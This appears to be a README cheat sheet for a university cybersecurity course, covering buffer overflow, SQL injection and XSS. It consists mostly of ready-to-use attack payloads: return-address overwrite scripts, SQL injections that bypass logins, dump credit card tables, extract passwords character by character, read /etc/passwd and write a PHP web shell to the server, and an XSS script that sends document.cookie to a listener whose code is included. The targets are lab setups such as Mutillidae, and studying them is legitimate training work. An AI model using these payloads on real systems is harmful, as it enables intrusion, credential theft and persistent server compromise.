# UNIMORE-cyber-security

```commandline
python3 -c 'print(int('0x2d'))'
```

## Buffer Overflow
```commandline
gcc -w -m32 -fno-stack-protector -fno-pic -no-pie -g -o
```

```commandline
python3 -c 'print("A"*number)' | ./esercizio1
```

### GDB
```commandline
$ gdb esercizio1
(gdb) disassamble main
```

### BE AWARE!!
```commandline
mov (or movb, movl, movw, movq)
lea
cmpl
```

### python2
```python
a = ""
for _ in range(10):
    a += "A"
print(a + '\x6b\x84\x04\x08')
```

### python3
```python
import sys

length = 10
payload = b"A" * length + b'\x6b\x84\x04\x08'
sys.stdout.buffer.write(payload)
```

## SQL Injection
> a space after the -- (comment macro) is required
```commandline
'-- 
```
```commandline
' or ''='' -- 
```
```commandline
' union select null, table_name, column_name,null,null,null,null from INFORMATION_SCHEMA.COLUMNS where table_name = 'credit_cards' -- 
```
```commandline
' union select null, ccnumber, ccv, expiration,null,null,null from credit_cards -- 
```
```commandline
' union select null, ccv, expiration,null,null,null,null from credit_cards where ccnumber=1234567812345678 -- 
```
```commandline
' union select null, LOAD_FILE('/etc/passwd'), null,null,null,null,null from credit_cards where ccnumber=1234567812345678 -- 
```
```commandline
scotty' AND password=(SELECT password FROM accounts WHERE username = 'scotty') -- 
```
```commandline
' OR LENGTH((SELECT password FROM accounts WHERE username='scotty'))=8 -- 
```
```commandline
john' AND LENGTH(password)=6; -- 
```
```commandline
john' AND SUBSTRING(password,-6,1)='m'; -- 
john' AND SUBSTRING(password,-6,1)='m' AND SUBSTRING(password,-5,1)='o'; -- 
john' AND SUBSTRING(password,-6,1)='m' AND SUBSTRING(password,-5,1)='o' AND SUBSTRING(password,-4,1)='n'; --
```
```commandline
' union select null,null,null,null,3,2,'<html><head></head><body><h1>Injection mode:</h1><form action="" method="post" enctype="application/x-www-form-urlencoded"><table style="margin-left:auto; margin-right:auto;"><tr><td colspan="2">Please enter system command</td></tr><tr><td></td></tr><tr><td class="label">Command</td><td><input type="text" name="pCommand" size="50"></td></tr><tr><td></td></tr><tr><td colspan="2" style="text-align:center;"><input type="submit" value="Execute Command" /></td></tr></table></form><?php echo "<pre>";echo shell_exec($_REQUEST["pCommand"]);echo "</pre>"; ?></body></html>' INTO DUMPFILE '/var/www/html/mutillidae/injection.php' -- 
```
## XSS
```commandline
<img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fcdn.bestmovie.it%2Fwp-content%2Fuploads%2F2020%2F06%2Fdonald-duck-su-disney-plus.png&f=1&nofb=1&ipt=c8cbf094b7800e8cb06494551c44104897ad20aeaed001a3a5fdf82ad525ae65">
```
```commandline
<form action="http://localhost:8000" method="POST">
  <input name="username" placeholder="Insert your name">
  <input type="submit">
</form>
```
### cookies
```commandline
<script>
  fetch("http://127.0.0.1:8000/", {
    method: "POST",
    body: document.cookie
  });
</script>
```
> save as listener.py
```commandline
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print("Data received:", post_data.decode())
        self.send_response(200)
        self.end_headers()

server = HTTPServer(('0.0.0.0', 8000), Handler)
print("Listening on port 8000...")
server.serve_forever()
```
```commandline
python3 listener.py
```
